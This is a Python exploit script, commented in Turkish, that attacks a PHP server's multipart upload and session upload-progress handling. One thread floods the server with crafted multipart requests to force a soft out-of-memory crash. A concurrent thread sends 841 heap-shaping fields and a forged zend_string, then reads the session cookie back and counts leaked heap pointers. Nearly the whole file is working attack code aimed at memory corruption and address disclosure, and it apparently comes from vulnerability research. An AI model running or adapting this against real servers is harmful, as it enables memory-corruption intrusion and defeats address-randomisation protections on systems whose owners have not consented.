#!/usr/bin/env python3
"""eness tam parametre + concurrent leak read — corruption window'ı yakala.

eness OOM'u 200 döner (soft OOM), sonra crash → corruption window.
Leak read CONCURRENT (thread) ile worker'a isabet etmeli.

Usage:
  python3 bf_eness_window.py --port 18113
"""
from __future__ import annotations
import argparse
import struct
import threading
import time

from common import (Target, build_multipart, parse_cookie,
                    count_heap_pointers)


def eness_oom(t: Target, size_mb: int) -> int:
    """eness-style OOM: 1001 small + file + 12MB field."""
    bnd = b"S" * 17
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (size_mb * 1024 * 1024)},
    ]
    body = build_multipart(parts, bnd)
    st, _ = t.post_chunked(body, bnd, read_cap=1 << 20)
    return st


def leak_read(t: Target) -> tuple[int, int, int]:
    """eness-style leak read: 841 shapers + forged zend_string."""
    lp = [
        {"name": "PHPSESSID", "data": b"attacksessionid0001"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        lp.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    lp.append({"name": "1999", "data": bytes(forge)})
    body = build_multipart(lp, b"BNDRY12345")
    st, raw = t.post_chunked(body, b"BNDRY12345", read_cap=9 << 20)
    cookie = parse_cookie(raw)
    base, cnt = count_heap_pointers(cookie, ~0x1FFFFF)
    return st, len(cookie), cnt


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="192.168.8.123")
    ap.add_argument("--port", type=int, default=18113)
    ap.add_argument("--size", type=int, default=12)
    ap.add_argument("--tries", type=int, default=5)
    args = ap.parse_args()

    print(f"{'try':>4} | {'stOOM':>6} | {'stLeak':>7} | {'cookie':>8} | "
          f"{'cnt':>4} | signal", flush=True)
    print("-" * 62, flush=True)

    for i in range(args.tries):
        t_oom = Target(args.host, args.port, verbose=False)
        t_leak = Target(args.host, args.port, verbose=False)
        result = {}

        def _oom():
            result["st"] = eness_oom(t_oom, args.size)

        def _leak():
            time.sleep(0.1)
            st, clen, cnt = leak_read(t_leak)
            result["leak_st"] = st
            result["leak_clen"] = clen
            result["leak_cnt"] = cnt

        th = threading.Thread(target=_oom)
        tl = threading.Thread(target=_leak)
        th.start()
        tl.start()
        th.join()
        tl.join()

        st_oom = result.get("st", 0)
        st_leak = result.get("leak_st", 0)
        clen = result.get("leak_clen", 0)
        cnt = result.get("leak_cnt", 0)
        signal = "LEAK!" if (clen > 100 and cnt >= 8) else (
            "big" if clen > 100 else "clean")
        print(f"{i+1:>4} | {st_oom:>6} | {st_leak:>7} | {clen:>7}B | "
              f"{cnt:>4} | {signal}", flush=True)
        time.sleep(1.0)

    print("-" * 62, flush=True)
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main())
